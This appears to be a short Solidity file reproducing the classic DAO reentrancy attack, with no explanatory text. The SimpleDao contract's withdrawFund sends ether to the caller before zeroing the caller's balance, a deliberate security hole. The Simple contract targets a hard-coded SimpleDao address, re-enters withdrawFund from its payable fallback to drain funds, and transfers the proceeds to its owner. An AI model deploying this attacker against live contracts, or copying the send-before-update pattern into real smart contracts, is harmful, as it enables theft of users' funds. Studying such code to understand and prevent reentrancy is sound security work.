contract SimpleDao{
    mapping(address =>uint)  public _balance;
    
    function withdrawFund() public returns(bool){
        uint x =_balance[msg.sender];
        msg.sender.call.value(x)();
        _balance[msg.sender]=0;
        return true;
}
}
contract Simple{
	SimpleDao public dao = SimpleDao(0xba8c397ad20d9d0525b8373cba116570ca33b95f);
	address owner;
	bool performAttack = true;
	function Simple(){owner = msg.sender;}
	function () public payable{
		dao.withdrawFund();
	}
	function withdrawnow() public{
	    owner.transfer(this.balance);
	}
}